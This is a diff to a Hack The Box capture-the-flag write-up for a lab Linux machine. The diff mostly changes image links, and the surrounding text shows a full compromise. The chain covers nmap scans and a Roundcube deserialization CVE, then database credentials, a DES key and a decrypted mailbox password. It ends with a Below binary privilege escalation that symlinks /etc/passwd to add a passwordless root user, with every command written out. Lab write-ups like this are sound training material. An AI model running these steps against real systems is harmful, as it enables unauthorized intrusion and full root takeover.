@@ -1,7 +1,6 @@
 # HTB Machine Writeup
 
 ## Machine Information
-
 - **Target IP**: 10.10.11.77
 - **Operating System**: Linux
 - **Difficulty**: Medium
@@ -20,10 +19,9 @@ Initial reconnaissance was performed using Nmap to identify open ports and servi
 nmap -sS -p- -Pn -n --open --min-rate 5000 -oG ./nmap/allports 10.10.11.77
 ```
 
-![[Pasted image 20250729215703.png]]
+![Nmap All Ports Scan](images/Pasted%20image%2020250729215703.png)
 
 The scan revealed two open ports:
-
 - Port 22 (SSH)
 - Port 80 (HTTP)
 
@@ -35,10 +33,9 @@ A detailed service scan was conducted to identify specific versions and configur
 nmap -sCV -p22,80 -Pn -n -oN ../nmap/vulnscan 10.10.11.77
 ```
 
-![[Pasted image 20250729215819.png]]
+![Nmap Service Scan](images/Pasted%20image%2020250729215819.png)
 
 **Results:**
-
 - **SSH (Port 22)**: OpenSSH service running
 - **HTTP (Port 80)**: Web server hosting Roundcube webmail application
 
@@ -48,7 +45,7 @@ nmap -sCV -p22,80 -Pn -n -oN ../nmap/vulnscan 10.10.11.77
 
 Upon accessing the web application at `http://10.10.11.77`, a Roundcube webmail login interface was discovered. Version detection revealed the application was running a vulnerable version of Roundcube.
 
-![[Pasted image 20250729220016.png]]
+![Roundcube Vulnerable Version](images/Pasted%20image%2020250729220016.png)
 
 ### Vulnerability Identification
 
@@ -59,7 +56,6 @@ The target was identified as running Roundcube Webmail version 1.6.10, which is 
 ### Exploit Research
 
 Research into CVE-2025-49113 led to the discovery of a public exploit available on GitHub:
-
 - **Repository**: https://github.com/hakaioffsec/CVE-2025-49113-exploit.git
 - **Vulnerability**: Deserialization vulnerability in Roundcube Webmail versions 1.5.0 through 1.6.10
 
@@ -82,12 +78,11 @@ While exploring the file system as `www-data`, the Roundcube configuration file 
 **File Location**: `/var/www/html/config/config.inc.php`
 
 **Database Credentials Found**:
-
 ```php
 $rcmail_config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';
 ```
 
-![[Pasted image 20250729220447.png]]
+![Database Configuration File](images/Pasted%20image%2020250729220447.png)
 
 ### Database Access
 
@@ -97,7 +92,7 @@ Using the discovered credentials, access was gained to the MariaDB database:
 mysql -u roundcube -p'RCDBPass2025' roundcube
 ```
 
-![[Pasted image 20250728223752.png]]
+![Database Access](images/Pasted%20image%2020250728223752.png)
 
 ### Data Extraction
 
@@ -105,21 +100,19 @@ Database enumeration revealed critical information in the following tables:
 
 **Users Table**: Contains user account information
 
-![[Pasted image 20250728223813.png]]
+![Database Tables](images/Pasted%20image%2020250728223813.png)
 
-![[Pasted image 20250728223833.png]]
+![Users Table Content](images/Pasted%20image%2020250728223833.png)
 
 **Session Table**: Contains encrypted session data including stored passwords
 
 ### Password Decryption
 
 From the session table, an encrypted password for user "jacob" was extracted:
-
 - **Username**: jacob
 - **Encrypted Password**: L7Rv00A8TuwJAr67kITxxcSgnIk25Am/
 
 The encryption key was found in the configuration:
-
 ```php
 $config['des_key'] = 'rcmail-!24ByteDESkey*Str';
 ```
@@ -174,18 +167,17 @@ result = decrypt_roundcube_password(encrypted_pass)
 
 **Decrypted Password**: 595mO8DmwGeD
 
-![[Pasted image 20250729210307.png]]
+![Password Decryption](images/Pasted%20image%2020250729210307.png)
 
 ### Email Access
 
 Using the decrypted credentials, access was gained to Jacob's webmail account. Analysis of the inbox revealed two important messages, one containing SSH credentials.
 
-![[Pasted image 20250729210506.png]]
+![Jacob's Email Access](images/Pasted%20image%2020250729210506.png)
 
-![[Pasted image 20250729210615.png]]
+![Important Email Message](images/Pasted%20image%2020250729210615.png)
 
 **SSH Credentials Discovered**:
-
 - **Username**: jacob
 - **Password**: gY4Wr3a1evp4
 
@@ -197,9 +189,9 @@ Successful SSH connection was established using the discovered credentials:
 ssh jacob@10.10.11.77
 ```
 
-![[Pasted image 20250729210739.png]]
+![SSH Connection](images/Pasted%20image%2020250729210739.png)
 
-![[Pasted image 20250729215434.png]]
+![User Access Confirmed](images/Pasted%20image%2020250729215434.png)
 
 ## Privilege Escalation - Phase 2
 
@@ -210,7 +202,6 @@ Upon gaining user-level access, system enumeration revealed the presence of the 
 ### Binary Analysis
 
 The Below binary was identified with the following characteristics:
-
 - **Location**: `/usr/bin/below`
 - **Permissions**: Executable with sudo privileges
 - **Version**: 0.8.0 (discovered using `sudo /usr/bin/below live`)
@@ -226,37 +217,31 @@ Research into Below version 0.8.0 revealed the presence of CVE-2025-27591, a pri
 The privilege escalation was achieved through the following steps:
 
 1. **Create a malicious user entry**:
-
 ```bash
 echo 'spy::0:0:spy:/root:/bin/bash' > /tmp/spyuser
 ```
 
 2. **Remove the existing error log**:
-
 ```bash
 rm -f /var/log/below/error_root.log
 ```
 
 3. **Create a symlink to /etc/passwd**:
-
 ```bash
 ln -s /etc/passwd /var/log/below/error_root.log
 ```
 
 4. **Trigger the Below binary to create a snapshot**:
-
 ```bash
 sudo /usr/bin/below snapshot --begin now
 ```
 
 5. **Overwrite the log file with malicious user data**:
-
 ```bash
 cp /tmp/spyuser /var/log/below/error_root.log
 ```
 
 6. **Switch to the new root user**:
-
 ```bash
 su spy
 ```
